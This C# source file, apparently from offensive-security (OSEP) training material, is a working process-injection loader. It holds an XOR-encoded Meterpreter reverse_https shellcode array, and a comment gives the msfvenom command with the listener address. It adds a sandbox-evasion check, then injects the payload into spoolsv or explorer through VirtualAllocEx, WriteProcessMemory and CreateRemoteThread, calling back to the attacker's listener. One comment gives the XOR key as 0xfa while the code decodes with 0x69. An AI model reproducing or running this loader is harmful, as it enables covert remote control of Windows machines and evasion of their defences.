﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace RemoteShinject
{
    public class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        // TODO: use the commented out section if 'true' doesn't work
        static bool IsElevated = true;
        //static bool IsElevated
        //{
        //    get
        //    {
        //        return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
        //    }
        //}

        public static void Main(string[] args)
        {
            // Sandbox evasion
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // Xor-encoded payload, key 0xfa
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.195 LPORT=443 EXITFUNC=thread -f csharp
            // OSEP-Code-Snippets/general_encoders/xor_shellcode.py "0xfc,0x48,0x83...
            byte[] buf = new byte[751] {
            0x95,0x21,0xea,0x8d,0x99,0x81,0xa5,0x69,0x69,0x69,0x28,0x38,
            0x28,0x39,0x3b,0x38,0x21,0x58,0xbb,0x0c,0x21,0xe2,0x3b,0x09,
            0x21,0xe2,0x3b,0x71,0x21,0xe2,0x3b,0x49,0x3f,0x24,0x58,0xa0,
            0x21,0xe2,0x1b,0x39,0x21,0x66,0xde,0x23,0x23,0x21,0x58,0xa9,
            0xc5,0x55,0x08,0x15,0x6b,0x45,0x49,0x28,0xa8,0xa0,0x64,0x28,
            0x68,0xa8,0x8b,0x84,0x3b,0x21,0xe2,0x3b,0x49,0xe2,0x2b,0x55,
            0x21,0x68,0xb9,0x0f,0xe8,0x11,0x71,0x62,0x6b,0x28,0x38,0x66,
            0xec,0x1b,0x69,0x69,0x69,0xe2,0xe9,0xe1,0x69,0x69,0x69,0x21,
            0xec,0xa9,0x1d,0x0e,0x21,0x68,0xb9,0x39,0x2d,0xe2,0x29,0x49,
            0x20,0x68,0xb9,0xe2,0x21,0x71,0x8a,0x3f,0x21,0x96,0xa0,0x28,
            0xe2,0x5d,0xe1,0x24,0x58,0xa0,0x21,0x68,0xbf,0x21,0x58,0xa9,
            0x28,0xa8,0xa0,0x64,0xc5,0x28,0x68,0xa8,0x51,0x89,0x1c,0x98,
            0x25,0x6a,0x25,0x4d,0x61,0x2c,0x50,0xb8,0x1c,0xb1,0x31,0x2d,
            0xe2,0x29,0x4d,0x20,0x68,0xb9,0x0f,0x28,0xe2,0x65,0x21,0x2d,
            0xe2,0x29,0x75,0x20,0x68,0xb9,0x28,0xe2,0x6d,0xe1,0x21,0x68,
            0xb9,0x28,0x31,0x28,0x31,0x37,0x30,0x33,0x28,0x31,0x28,0x30,
            0x28,0x33,0x21,0xea,0x85,0x49,0x28,0x3b,0x96,0x89,0x31,0x28,
            0x30,0x33,0x21,0xe2,0x7b,0x80,0x22,0x96,0x96,0x96,0x34,0x21,
            0x58,0xb2,0x3a,0x20,0xd7,0x1e,0x00,0x07,0x00,0x07,0x0c,0x1d,
            0x69,0x28,0x3f,0x21,0xe0,0x88,0x20,0xae,0xab,0x25,0x1e,0x4f,
            0x6e,0x96,0xbc,0x3a,0x3a,0x21,0xe0,0x88,0x3a,0x33,0x24,0x58,
            0xa9,0x24,0x58,0xa0,0x3a,0x3a,0x20,0xd3,0x53,0x3f,0x10,0xce,
            0x69,0x69,0x69,0x69,0x96,0xbc,0x81,0x66,0x69,0x69,0x69,0x58,
            0x50,0x5b,0x47,0x58,0x5f,0x51,0x47,0x5d,0x5c,0x47,0x58,0x50,
            0x5c,0x69,0x33,0x21,0xe0,0xa8,0x20,0xae,0xa9,0xd2,0x68,0x69,
            0x69,0x24,0x58,0xa0,0x3a,0x3a,0x03,0x6a,0x3a,0x20,0xd3,0x3e,
            0xe0,0xf6,0xaf,0x69,0x69,0x69,0x69,0x96,0xbc,0x81,0xad,0x69,
            0x69,0x69,0x46,0x5d,0x1d,0x3c,0x05,0x2b,0x05,0x24,0x44,0x5c,
            0x38,0x07,0x1d,0x38,0x26,0x11,0x2a,0x00,0x0c,0x11,0x07,0x2c,
            0x0e,0x44,0x24,0x31,0x44,0x18,0x27,0x13,0x38,0x1a,0x02,0x3a,
            0x2f,0x5d,0x36,0x03,0x2f,0x1c,0x44,0x13,0x2f,0x1a,0x58,0x31,
            0x1b,0x01,0x01,0x50,0x5e,0x06,0x02,0x19,0x59,0x44,0x13,0x03,
            0x5d,0x30,0x2c,0x36,0x21,0x10,0x2a,0x03,0x39,0x2d,0x0a,0x06,
            0x1d,0x20,0x44,0x1d,0x44,0x21,0x1e,0x0e,0x3b,0x38,0x1d,0x3d,
            0x23,0x0b,0x25,0x3b,0x2e,0x10,0x3d,0x2a,0x28,0x44,0x24,0x00,
            0x1d,0x1e,0x31,0x5b,0x0a,0x5c,0x18,0x5c,0x21,0x20,0x59,0x22,
            0x11,0x0a,0x3c,0x01,0x5c,0x2f,0x1e,0x11,0x3a,0x39,0x02,0x3a,
            0x44,0x58,0x03,0x22,0x03,0x1c,0x36,0x1c,0x5b,0x01,0x27,0x3e,
            0x0c,0x02,0x2e,0x2b,0x2b,0x5e,0x2a,0x07,0x26,0x39,0x28,0x28,
            0x2a,0x58,0x0d,0x25,0x5f,0x5f,0x20,0x59,0x01,0x39,0x3d,0x22,
            0x30,0x5e,0x04,0x30,0x1f,0x05,0x5c,0x2e,0x30,0x0b,0x0c,0x1b,
            0x2b,0x3b,0x2d,0x2a,0x58,0x2e,0x0c,0x0c,0x19,0x1f,0x1f,0x0b,
            0x03,0x24,0x23,0x02,0x10,0x38,0x5e,0x0a,0x06,0x28,0x08,0x25,
            0x13,0x1b,0x3e,0x1f,0x1b,0x69,0x21,0xe0,0xa8,0x3a,0x33,0x28,
            0x31,0x24,0x58,0xa0,0x3a,0x21,0xd1,0x69,0x5b,0xc1,0xed,0x69,
            0x69,0x69,0x69,0x39,0x3a,0x3a,0x20,0xae,0xab,0x82,0x3c,0x47,
            0x52,0x96,0xbc,0x21,0xe0,0xaf,0x03,0x63,0x36,0x21,0xe0,0x98,
            0x03,0x76,0x33,0x3b,0x01,0xe9,0x5a,0x69,0x69,0x20,0xe0,0x89,
            0x03,0x6d,0x28,0x30,0x20,0xd3,0x1c,0x2f,0xf7,0xef,0x69,0x69,
            0x69,0x69,0x96,0xbc,0x24,0x58,0xa9,0x3a,0x33,0x21,0xe0,0x98,
            0x24,0x58,0xa0,0x24,0x58,0xa0,0x3a,0x3a,0x20,0xae,0xab,0x44,
            0x6f,0x71,0x12,0x96,0xbc,0xec,0xa9,0x1c,0x76,0x21,0xae,0xa8,
            0xe1,0x7a,0x69,0x69,0x20,0xd3,0x2d,0x99,0x5c,0x89,0x69,0x69,
            0x69,0x69,0x96,0xbc,0x21,0x96,0xa6,0x1d,0x6b,0x82,0xc3,0x81,
            0x3c,0x69,0x69,0x69,0x3a,0x30,0x03,0x29,0x33,0x20,0xe0,0xb8,
            0xa8,0x8b,0x79,0x20,0xae,0xa9,0x69,0x79,0x69,0x69,0x20,0xd3,
            0x31,0xcd,0x3a,0x8c,0x69,0x69,0x69,0x69,0x96,0xbc,0x21,0xfa,
            0x3a,0x3a,0x21,0xe0,0x8e,0x21,0xe0,0x98,0x21,0xe0,0xb3,0x20,
            0xae,0xa9,0x69,0x49,0x69,0x69,0x20,0xe0,0x90,0x20,0xd3,0x7b,
            0xff,0xe0,0x8b,0x69,0x69,0x69,0x69,0x96,0xbc,0x21,0xea,0xad,
            0x49,0xec,0xa9,0x1d,0xdb,0x0f,0xe2,0x6e,0x21,0x68,0xaa,0xec,
            0xa9,0x1c,0xbb,0x31,0xaa,0x31,0x03,0x69,0x30,0xd2,0x89,0x74,
            0x43,0x63,0x28,0xe0,0xb3,0x96,0xbc};

            int len = buf.Length;

            // Parse arguments, if given (process to inject)
            String procName = "";
            if (args.Length == 1)
            {
                procName = args[0];
            }
            else if (args.Length == 0) {
                // Inject based on elevation level
                if (IsElevated)
                {
                    Console.WriteLine("Process is elevated.");
                    procName = "spoolsv";
                } 
                else
                {
                    Console.WriteLine("Process is not elevated.");
                    procName = "explorer";
                }
            }
            else
            {
                Console.WriteLine("Please give either one argument for a process to inject, e.g. \".\\ShInject.exe explorer\", or leave empty for auto-injection.");
                return;
            }

            Console.WriteLine($"Attempting to inject into {procName} process...");

            // Get process IDs
            Process[] expProc = Process.GetProcessesByName(procName);

            // If multiple processes exist, try to inject in all of them
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // Get a handle on the process
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // Allocate memory in the remote process
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // Decode the payload
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0x69);
                }

                // Write the payload to the allocated bytes
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                break;
            }
        }
    }
}